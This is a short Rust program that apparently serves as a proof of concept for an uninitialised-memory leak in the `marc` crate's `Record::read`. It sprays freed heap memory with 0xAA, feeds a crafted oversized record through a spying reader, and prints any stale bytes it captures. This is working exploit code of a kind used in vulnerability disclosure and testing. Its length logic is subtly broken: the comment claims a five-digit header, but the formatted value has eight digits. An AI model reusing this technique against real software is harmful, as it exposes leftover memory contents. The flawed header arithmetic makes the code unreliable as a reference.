#![forbid(unsafe_code)]

use marc::Record;
use std::{
    io::{self, Cursor, Read},
    mem,
};

/// Reader that grabs every byte in `buf` **before** real data are written.
struct Spy<R: Read> {
    inner: R,
    before: Vec<u8>,
}

impl<R: Read> Read for Spy<R> {
    fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
        self.before.extend_from_slice(buf);
        self.inner.read(buf)
    }
}

fn main() -> io::Result<()> {
    const MEG: usize = 1024 * 1024;
    const LEN: usize = 64 * MEG + 5;           // 64 MiB body + 5-byte header

    // Dirty a large chunk of heap with 0xAA then free it.
    {
        let mut junk = vec![0xAAu8; LEN];
        // make sure the pages really exist
        for x in &mut junk { *x = 0xAA }
        mem::drop(junk);
    }

    // Craft a bogus MARC record whose length is exactly LEN.
    let len_str = format!("{:05}", LEN);        // 5 ASCII digits
    let mut bytes = len_str.into_bytes();
    bytes.resize(LEN, 0);

    // Wrap the data in our spying reader and trigger Record::read.
    let reader = Cursor::new(bytes);
    let mut spy = Spy { inner: reader, before: Vec::new() };
    let _ = Record::read(&mut spy);             // expect Err â€“ fine

    // Did we capture any non-zero, non-ASCII data?
    let leaked = spy.before.iter().take(32)     // look at first 32 bytes
        .cloned().collect::<Vec<_>>();
    println!("First 32 leaked bytes: {:02x?}", leaked);

    let dirty = leaked.iter().any(|&b| b >= 0xAA);
    println!("Uninitialised bytes observed?  {}", dirty);

    Ok(())
}
